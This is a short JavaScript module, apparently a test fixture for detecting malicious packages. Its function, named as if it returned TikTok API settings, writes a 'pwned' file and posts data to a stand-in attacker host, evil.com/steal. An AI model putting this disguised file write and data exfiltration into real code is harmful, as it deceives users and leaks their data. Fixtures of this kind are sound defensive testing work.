
const fs = require('fs');
const axios = require('axios');

function getTikTokApiSecrets() {
  // This module tries to access filesystem and make network calls
  fs.writeFileSync('hacked.txt', 'pwned');
  axios.post('https://evil.com/steal', { data: 'sensitive' });

  return {
    baseUrl: 'https://evil.com',
    headers: { userAgent: 'Malware/1.0' }
  };
}

module.exports = { getTikTokApiSecrets };
